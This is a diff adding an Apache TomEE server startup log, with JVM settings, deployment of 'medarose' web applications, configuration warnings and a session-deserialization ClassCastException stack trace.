@@ -1,0 +1,1012 @@
+14-Jul-2024 16:58:55.153 WARNING [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke Match [Server/Service/Engine/Host/Context] failed to set property [debug] to [0]
+14-Jul-2024 16:58:55.181 WARNING [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke Match [Server/Service/Engine/Host/Context] failed to set property [debug] to [0]
+14-Jul-2024 16:58:55.194 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke Server version name:   Apache Tomcat (TomEE)/9.0.35 (8.0.3)
+14-Jul-2024 16:58:55.195 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke Server built:          May 5 2020 20:36:20 UTC
+14-Jul-2024 16:58:55.195 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke Server version number: 9.0.35.0
+14-Jul-2024 16:58:55.195 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke OS Name:               Linux
+14-Jul-2024 16:58:55.195 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke OS Version:            4.18.0-348.7.1.el8_5.x86_64
+14-Jul-2024 16:58:55.195 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke Architecture:          amd64
+14-Jul-2024 16:58:55.195 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke Java Home:             /usr/local/java/jdk-11.0.17
+14-Jul-2024 16:58:55.195 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke JVM Version:           11.0.17+10-LTS-269
+14-Jul-2024 16:58:55.196 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke JVM Vendor:            Oracle Corporation
+14-Jul-2024 16:58:55.196 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke CATALINA_BASE:         /opt/tomee/apache-tomee-webprofile-8.0.3
+14-Jul-2024 16:58:55.196 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke CATALINA_HOME:         /opt/tomee/apache-tomee-webprofile-8.0.3
+14-Jul-2024 16:58:55.197 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke Command line argument: --add-opens=java.base/java.lang=ALL-UNNAMED
+14-Jul-2024 16:58:55.197 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke Command line argument: --add-opens=java.base/java.io=ALL-UNNAMED
+14-Jul-2024 16:58:55.197 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke Command line argument: --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
+14-Jul-2024 16:58:55.197 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke Command line argument: -Djava.util.logging.config.file=/opt/tomee/apache-tomee-webprofile-8.0.3/conf/logging.properties
+14-Jul-2024 16:58:55.198 INFO [main] jdk.internal.reflect.NativeMethodAccessorImpl.invoke Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+14-Jul-2024 16:58:55.198 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Command line argument: -javaagent:/opt/tomee/apache-tomee-webprofile-8.0.3/lib/openejb-javaagent.jar
+14-Jul-2024 16:58:55.198 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Command line argument: -Djava.security.egd=file:///dev/urandom
+14-Jul-2024 16:58:55.198 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+14-Jul-2024 16:58:55.198 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+14-Jul-2024 16:58:55.198 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+14-Jul-2024 16:58:55.198 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Command line argument: -Xms512M
+14-Jul-2024 16:58:55.199 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Command line argument: -Xmx1024M
+14-Jul-2024 16:58:55.199 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Command line argument: -XX:+UseParallelGC
+14-Jul-2024 16:58:55.199 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Command line argument: -Dignore.endorsed.dirs=
+14-Jul-2024 16:58:55.199 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Command line argument: -Dcatalina.base=/opt/tomee/apache-tomee-webprofile-8.0.3
+14-Jul-2024 16:58:55.199 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Command line argument: -Dcatalina.home=/opt/tomee/apache-tomee-webprofile-8.0.3
+14-Jul-2024 16:58:55.199 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Command line argument: -Djava.io.tmpdir=/opt/tomee/apache-tomee-webprofile-8.0.3/temp
+14-Jul-2024 16:58:55.199 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib:/usr/lib64:/lib64:/lib:/usr/lib]
+14-Jul-2024 16:58:55.756 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Initializing ProtocolHandler ["http-nio-8080"]
+14-Jul-2024 16:58:56.229 INFO [main] org.apache.openejb.util.OptionsLog.info Using 'openejb.jdbc.datasource-creator=org.apache.tomee.jdbc.TomEEDataSourceCreator'
+14-Jul-2024 16:58:56.320 INFO [main] org.apache.openejb.OpenEJB$Instance.<init> ********************************************************************************
+14-Jul-2024 16:58:56.321 INFO [main] org.apache.openejb.OpenEJB$Instance.<init> OpenEJB http://tomee.apache.org/
+14-Jul-2024 16:58:56.321 INFO [main] org.apache.openejb.OpenEJB$Instance.<init> Startup: Sun Jul 14 16:58:56 IRST 2024
+14-Jul-2024 16:58:56.321 INFO [main] org.apache.openejb.OpenEJB$Instance.<init> Copyright 1999-2018 (C) Apache OpenEJB Project, All Rights Reserved.
+14-Jul-2024 16:58:56.321 INFO [main] org.apache.openejb.OpenEJB$Instance.<init> Version: 8.0.3
+14-Jul-2024 16:58:56.322 INFO [main] org.apache.openejb.OpenEJB$Instance.<init> Build date: 20200619
+14-Jul-2024 16:58:56.322 INFO [main] org.apache.openejb.OpenEJB$Instance.<init> Build time: 11:54
+14-Jul-2024 16:58:56.322 INFO [main] org.apache.openejb.OpenEJB$Instance.<init> ********************************************************************************
+14-Jul-2024 16:58:56.322 INFO [main] org.apache.openejb.OpenEJB$Instance.<init> openejb.home = /opt/tomee/apache-tomee-webprofile-8.0.3
+14-Jul-2024 16:58:56.322 INFO [main] org.apache.openejb.OpenEJB$Instance.<init> openejb.base = /opt/tomee/apache-tomee-webprofile-8.0.3
+14-Jul-2024 16:58:56.324 INFO [main] org.apache.openejb.cdi.CdiBuilder.initializeOWB Created new singletonService org.apache.openejb.cdi.ThreadSingletonServiceImpl@2e11485
+14-Jul-2024 16:58:56.328 INFO [main] org.apache.openejb.cdi.CdiBuilder.initializeOWB Succeeded in installing singleton service
+14-Jul-2024 16:58:56.356 INFO [main] org.apache.openejb.config.ConfigurationFactory.init TomEE configuration file is '/opt/tomee/apache-tomee-webprofile-8.0.3/conf/tomee.xml'
+14-Jul-2024 16:58:56.398 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureService Configuring Service(id=Tomcat Security Service, type=SecurityService, provider-id=Tomcat Security Service)
+14-Jul-2024 16:58:56.400 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureService Configuring Service(id=Default Transaction Manager, type=TransactionManager, provider-id=Default Transaction Manager)
+14-Jul-2024 16:58:56.403 INFO [main] org.apache.openejb.util.OptionsLog.info Using 'openejb.deployments.classpath=false'
+14-Jul-2024 16:58:56.405 INFO [main] org.apache.openejb.assembler.classic.Assembler.createRecipe Creating TransactionManager(id=Default Transaction Manager)
+14-Jul-2024 16:58:56.459 INFO [main] org.apache.openejb.assembler.classic.Assembler.createRecipe Creating SecurityService(id=Tomcat Security Service)
+14-Jul-2024 16:58:56.891 INFO [main] org.apache.openejb.server.ServiceManager.initServer Creating ServerService(id=cxf-rs)
+14-Jul-2024 16:58:57.133 INFO [main] org.apache.openejb.server.SimpleServiceManager.start   ** Bound Services **
+14-Jul-2024 16:58:57.133 INFO [main] org.apache.openejb.server.SimpleServiceManager.printRow   NAME                 IP              PORT  
+14-Jul-2024 16:58:57.133 INFO [main] org.apache.openejb.server.SimpleServiceManager.start -------
+14-Jul-2024 16:58:57.133 INFO [main] org.apache.openejb.server.SimpleServiceManager.start Ready!
+14-Jul-2024 16:58:57.134 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Server initialization in [2,319] milliseconds
+14-Jul-2024 16:58:57.200 INFO [main] org.apache.tomee.catalina.OpenEJBNamingContextListener.bindResource Importing a Tomcat Resource with id 'UserDatabase' of type 'org.apache.catalina.UserDatabase'.
+14-Jul-2024 16:58:57.200 INFO [main] org.apache.openejb.assembler.classic.Assembler.createRecipe Creating Resource(id=UserDatabase)
+14-Jul-2024 16:58:57.220 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Starting service [Catalina]
+14-Jul-2024 16:58:57.220 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Starting Servlet engine: [Apache Tomcat (TomEE)/9.0.35 (8.0.3)]
+14-Jul-2024 16:58:57.235 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.init ------------------------- localhost -> /
+14-Jul-2024 16:58:57.614 SEVERE [main] org.apache.openejb.config.DeploymentLoader.addFacesConfigs A faces configuration file should be context relative when specified in web.xml. Please fix the value of context parameter javax.faces.CONFIG_FILES for the file WEB-INF/faces-config.xml
+14-Jul-2024 16:58:59.403 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureApplication Configuring enterprise application: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war
+14-Jul-2024 16:59:01.153 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureService Configuring Service(id=Default Managed Container, type=Container, provider-id=Default Managed Container)
+14-Jul-2024 16:59:01.154 INFO [main] org.apache.openejb.config.AutoConfig.createContainer Auto-creating a container for bean .Comp844187494: Container(type=MANAGED, id=Default Managed Container)
+14-Jul-2024 16:59:01.155 INFO [main] org.apache.openejb.assembler.classic.Assembler.createRecipe Creating Container(id=Default Managed Container)
+14-Jul-2024 16:59:01.163 INFO [main] org.apache.openejb.core.managed.SimplePassivater.init Using directory /opt/tomee/apache-tomee-webprofile-8.0.3/temp for stateful session passivation
+14-Jul-2024 16:59:01.206 INFO [main] org.apache.openejb.config.AppInfoBuilder.build Enterprise application "/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war" loaded.
+14-Jul-2024 16:59:01.220 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Assembling app: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war
+14-Jul-2024 16:59:01.301 INFO [main] org.apache.openejb.cdi.CdiBuilder.initSingleton Existing thread singleton service in SystemInstance(): org.apache.openejb.cdi.ThreadSingletonServiceImpl@2e11485
+14-Jul-2024 16:59:01.385 INFO [main] org.apache.openejb.cdi.ManagedSecurityService.<init> Some Principal APIs could not be loaded: org.eclipse.microprofile.jwt.JsonWebToken out of org.eclipse.microprofile.jwt.JsonWebToken not found
+14-Jul-2024 16:59:01.419 INFO [main] org.apache.openejb.cdi.OpenEJBLifecycle.startApplication OpenWebBeans Container is starting...
+14-Jul-2024 16:59:01.426 INFO [main] org.apache.webbeans.plugins.PluginLoader.startUp Adding OpenWebBeansPlugin : [CdiPlugin]
+14-Jul-2024 16:59:01.620 INFO [main] org.apache.openejb.cdi.CdiScanner.handleBda Using annotated mode for file:/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war/WEB-INF/lib/cdi-api-2.0.jar looking all classes to find CDI beans, maybe think to add a beans.xml if not there or add the jar to exclusions.list
+14-Jul-2024 16:59:01.726 INFO [main] org.springframework.data.mongodb.repository.cdi.MongoRepositoryExtension.<init> Activating CDI extension for Spring Data MongoDB repositories.
+14-Jul-2024 16:59:02.741 INFO [main] org.apache.webbeans.config.BeansDeployer.validateInjectionPoints All injection points were validated successfully.
+14-Jul-2024 16:59:02.762 INFO [main] org.apache.openejb.cdi.OpenEJBLifecycle.startApplication OpenWebBeans Container has started, it took 1343 ms.
+14-Jul-2024 16:59:02.818 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Deployed Application(path=/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war)
+14-Jul-2024 16:59:03.648 INFO [main] org.apache.myfaces.ee.MyFacesContainerInitializer.onStartup Using org.apache.myfaces.ee.MyFacesContainerInitializer
+14-Jul-2024 16:59:03.653 INFO [main] org.omnifaces.ApplicationInitializer.logOmniFacesVersion Using OmniFaces version 3.2
+14-Jul-2024 16:59:04.272 INFO [main] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
+14-Jul-2024 16:59:04.646 SEVERE [main] com.ocpsoft.pretty.faces.config.spi.ContextSpecifiedConfigurationProvider.loadConfiguration Pretty Faces config resource [/META-INF/pretty-config.xml] not found.
+14-Jul-2024 16:59:04.801 INFO [main] com.sun.faces.config.ConfigureListener.contextInitialized Initializing Mojarra 2.3.4 ( 20180405-0442 7a05fbdf38c7d725ccac9237e44de6dbc77bee7d) for context ''
+14-Jul-2024 16:59:05.369 INFO [main] org.ocpsoft.rewrite.faces.RewritePhaseListener.null RewritePhaseListener starting up.
+14-Jul-2024 16:59:06.337 INFO [main] org.primefaces.webapp.PostConstructApplicationEventListener.processEvent Running on PrimeFaces 8.0
+14-Jul-2024 16:59:06.338 INFO [main] org.primefaces.extensions.application.PostConstructApplicationEventListener.processEvent Running on PrimeFaces Extensions 8.0.2
+14-Jul-2024 16:59:06.382 SEVERE [main] org.apache.catalina.session.StandardManager.startInternal Exception loading sessions from persistent storage
+	java.lang.ClassCastException: class java.lang.String cannot be cast to class java.io.ObjectStreamClass (java.lang.String and java.io.ObjectStreamClass are in module java.base of loader 'bootstrap')
+		at java.base/java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1884)
+		at java.base/java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2223)
+		at java.base/java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1709)
+		at java.base/java.io.ObjectInputStream.readArray(ObjectInputStream.java:2156)
+		at java.base/java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1697)
+		at java.base/java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:2518)
+		at java.base/java.io.ObjectInputStream.defaultReadObject(ObjectInputStream.java:636)
+		at java.base/java.util.concurrent.ConcurrentHashMap.readObject(ConcurrentHashMap.java:1448)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+		at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+		at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+		at java.base/java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1175)
+		at java.base/java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2379)
+		at java.base/java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2250)
+		at java.base/java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1709)
+		at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:500)
+		at java.base/java.io.ObjectInputStream.readObject(ObjectInputStream.java:458)
+		at org.apache.catalina.session.StandardSession.doReadObject(StandardSession.java:1587)
+		at org.apache.catalina.session.StandardSession.readObjectData(StandardSession.java:1040)
+		at org.apache.catalina.session.StandardManager.doLoad(StandardManager.java:218)
+		at org.apache.catalina.session.StandardManager.load(StandardManager.java:162)
+		at org.apache.catalina.session.StandardManager.startInternal(StandardManager.java:354)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5164)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1384)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1374)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:140)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:909)
+		at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:841)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1384)
+		at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1374)
+		at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
+		at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
+		at java.base/java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:140)
+		at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:909)
+		at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:262)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardService.startInternal(StandardService.java:421)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:930)
+		at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
+		at org.apache.catalina.startup.Catalina.start(Catalina.java:633)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+		at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+		at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+		at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+		at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:343)
+		at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:474)
+14-Jul-2024 16:59:06.389 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null RewriteFilter starting up...
+14-Jul-2024 16:59:06.417 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [4] org.ocpsoft.rewrite.servlet.spi.RewriteLifecycleListener [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRewriteLifecycleListener<-100>, org.ocpsoft.rewrite.faces.FacesRewriteLifecycleListener<0>, org.ocpsoft.rewrite.servlet.config.lifecycle.JoinRewriteLifecycleListener<2147483647>, org.ocpsoft.rewrite.servlet.impl.DefaultRewriteLifecycleListener<2147483647>]
+14-Jul-2024 16:59:06.417 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RequestCycleWrapper [org.ocpsoft.rewrite.servlet.impl.HttpRewriteRequestCycleWrapper<0>]
+14-Jul-2024 16:59:06.417 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.RewriteProvider [org.ocpsoft.rewrite.servlet.impl.DefaultHttpRewriteProvider<0>]
+14-Jul-2024 16:59:06.417 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RewriteResultHandler [org.ocpsoft.rewrite.servlet.impl.HttpRewriteResultHandler<0>]
+14-Jul-2024 16:59:06.417 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.InboundRewriteProducer [org.ocpsoft.rewrite.servlet.impl.HttpInboundRewriteProducer<0>]
+14-Jul-2024 16:59:06.417 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.OutboundRewriteProducer [org.ocpsoft.rewrite.servlet.impl.HttpOutboundRewriteProducer<0>]
+14-Jul-2024 16:59:06.418 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.ContextListener [org.ocpsoft.rewrite.prettyfaces.PrettyConfigContextListener<0>]
+14-Jul-2024 16:59:06.418 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [0] org.ocpsoft.rewrite.servlet.spi.RequestListener []
+14-Jul-2024 16:59:06.419 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RequestParameterProvider [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRequestParameterProvider<0>]
+14-Jul-2024 16:59:06.421 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.el.spi.ExpressionLanguageProvider [org.ocpsoft.rewrite.faces.FacesExpressionLanguageProvider<30>]
+14-Jul-2024 16:59:06.422 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.InvocationResultHandler [org.ocpsoft.rewrite.faces.NavigatingInvocationResultHandler<100>]
+14-Jul-2024 16:59:06.423 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [0] org.ocpsoft.common.spi.ServiceEnricher []
+14-Jul-2024 16:59:06.425 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.ConfigurationCacheProvider [org.ocpsoft.rewrite.servlet.impl.ServletContextConfigurationCacheProvider<0>]
+14-Jul-2024 16:59:06.429 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [2] org.ocpsoft.rewrite.config.ConfigurationProvider [org.ocpsoft.rewrite.annotation.config.AnnotationConfigProvider<100>, org.ocpsoft.rewrite.prettyfaces.PrettyFacesRewriteConfigurationProvider<1>]
+14-Jul-2024 16:59:06.433 INFO [main] org.ocpsoft.rewrite.servlet.impl.DefaultHttpRewriteProvider.null Loaded [0] org.ocpsoft.rewrite.spi.RuleCacheProvider []
+14-Jul-2024 16:59:06.703 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Rewrite 3.4.2.Final initialized.
+14-Jul-2024 16:59:06.758 INFO [main] jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke Deploying web application archive [/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old.war]
+14-Jul-2024 16:59:06.758 INFO [main] org.apache.tomee.catalina.TomcatWebAppBuilder.init ------------------------- localhost -> /medarose_war_old
+14-Jul-2024 16:59:06.854 WARNING [main] org.apache.openejb.config.DeploymentLoader.getWebDescriptors Can't have a beans.xml in WEB-INF and WEB-INF/classes/META-INF, second will be ignored
+14-Jul-2024 16:59:06.854 WARNING [main] org.apache.openejb.config.DeploymentLoader.getWebDescriptors Can't have a beans.xml in WEB-INF and WEB-INF/classes/META-INF, second will be ignored
+14-Jul-2024 16:59:06.946 SEVERE [main] org.apache.openejb.config.DeploymentLoader.addFacesConfigs A faces configuration file should be context relative when specified in web.xml. Please fix the value of context parameter javax.faces.CONFIG_FILES for the file WEB-INF/faces-config.xml
+14-Jul-2024 16:59:08.167 INFO [main] org.apache.openejb.config.ConfigurationFactory.configureApplication Configuring enterprise application: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old
+14-Jul-2024 16:59:09.406 INFO [main] org.apache.openejb.config.AppInfoBuilder.build Enterprise application "/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old" loaded.
+14-Jul-2024 16:59:09.406 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Assembling app: /opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old
+14-Jul-2024 16:59:09.414 INFO [main] org.apache.openejb.cdi.CdiBuilder.initSingleton Existing thread singleton service in SystemInstance(): org.apache.openejb.cdi.ThreadSingletonServiceImpl@2e11485
+14-Jul-2024 16:59:09.417 INFO [main] org.apache.openejb.cdi.ManagedSecurityService.<init> Some Principal APIs could not be loaded: org.eclipse.microprofile.jwt.JsonWebToken out of org.eclipse.microprofile.jwt.JsonWebToken not found
+14-Jul-2024 16:59:09.420 INFO [main] org.apache.openejb.cdi.OpenEJBLifecycle.startApplication OpenWebBeans Container is starting...
+14-Jul-2024 16:59:09.421 INFO [main] org.apache.webbeans.plugins.PluginLoader.startUp Adding OpenWebBeansPlugin : [CdiPlugin]
+14-Jul-2024 16:59:09.555 INFO [main] org.apache.openejb.cdi.CdiScanner.handleBda Using annotated mode for file:/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old/WEB-INF/lib/cdi-api-2.0.jar looking all classes to find CDI beans, maybe think to add a beans.xml if not there or add the jar to exclusions.list
+14-Jul-2024 16:59:09.656 INFO [main] org.springframework.data.mongodb.repository.cdi.MongoRepositoryExtension.<init> Activating CDI extension for Spring Data MongoDB repositories.
+14-Jul-2024 16:59:10.164 INFO [main] org.apache.webbeans.config.BeansDeployer.validateInjectionPoints All injection points were validated successfully.
+14-Jul-2024 16:59:10.171 INFO [main] org.apache.openejb.cdi.OpenEJBLifecycle.startApplication OpenWebBeans Container has started, it took 751 ms.
+14-Jul-2024 16:59:10.177 INFO [main] org.apache.openejb.assembler.classic.Assembler.createApplication Deployed Application(path=/opt/tomee/apache-tomee-webprofile-8.0.3/webapps/medarose_war_old)
+14-Jul-2024 16:59:10.762 INFO [main] org.apache.myfaces.ee.MyFacesContainerInitializer.onStartup Using org.apache.myfaces.ee.MyFacesContainerInitializer
+14-Jul-2024 16:59:10.764 INFO [main] org.omnifaces.ApplicationInitializer.logOmniFacesVersion Using OmniFaces version 3.2
+14-Jul-2024 16:59:11.000 INFO [main] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
+14-Jul-2024 16:59:11.315 SEVERE [main] com.ocpsoft.pretty.faces.config.spi.ContextSpecifiedConfigurationProvider.loadConfiguration Pretty Faces config resource [/META-INF/pretty-config.xml] not found.
+14-Jul-2024 16:59:11.387 INFO [main] com.sun.faces.config.ConfigureListener.contextInitialized Initializing Mojarra 2.3.4 ( 20180405-0442 7a05fbdf38c7d725ccac9237e44de6dbc77bee7d) for context '/medarose_war_old'
+14-Jul-2024 16:59:11.805 INFO [main] org.ocpsoft.rewrite.faces.RewritePhaseListener.null RewritePhaseListener starting up.
+14-Jul-2024 16:59:12.612 INFO [main] org.primefaces.webapp.PostConstructApplicationEventListener.processEvent Running on PrimeFaces 8.0
+14-Jul-2024 16:59:12.614 INFO [main] org.primefaces.extensions.application.PostConstructApplicationEventListener.processEvent Running on PrimeFaces Extensions 8.0
+14-Jul-2024 16:59:12.622 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null RewriteFilter starting up...
+14-Jul-2024 16:59:12.651 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [4] org.ocpsoft.rewrite.servlet.spi.RewriteLifecycleListener [org.ocpsoft.rewrite.prettyfaces.PrettyFacesRewriteLifecycleListener<-100>, org.ocpsoft.rewrite.faces.FacesRewriteLifecycleListener<0>, org.ocpsoft.rewrite.servlet.impl.DefaultRewriteLifecycleListener<2147483647>, org.ocpsoft.rewrite.servlet.config.lifecycle.JoinRewriteLifecycleListener<2147483647>]
+14-Jul-2024 16:59:12.651 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RequestCycleWrapper [org.ocpsoft.rewrite.servlet.impl.HttpRewriteRequestCycleWrapper<0>]
+14-Jul-2024 16:59:12.651 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.spi.RewriteProvider [org.ocpsoft.rewrite.servlet.impl.DefaultHttpRewriteProvider<0>]
+14-Jul-2024 16:59:12.651 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.RewriteResultHandler [org.ocpsoft.rewrite.servlet.impl.HttpRewriteResultHandler<0>]
+14-Jul-2024 16:59:12.651 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.InboundRewriteProducer [org.ocpsoft.rewrite.servlet.impl.HttpInboundRewriteProducer<0>]
+14-Jul-2024 16:59:12.651 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.OutboundRewriteProducer [org.ocpsoft.rewrite.servlet.impl.HttpOutboundRewriteProducer<0>]
+14-Jul-2024 16:59:12.652 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [1] org.ocpsoft.rewrite.servlet.spi.ContextListener [org.ocpsoft.rewrite.prettyfaces.PrettyConfigContextListener<0>]
+14-Jul-2024 16:59:12.652 INFO [main] org.ocpsoft.rewrite.servlet.RewriteFilter.null Loaded [0] org.ocpsoft.rewrite.servlet.spi.RequestListener []
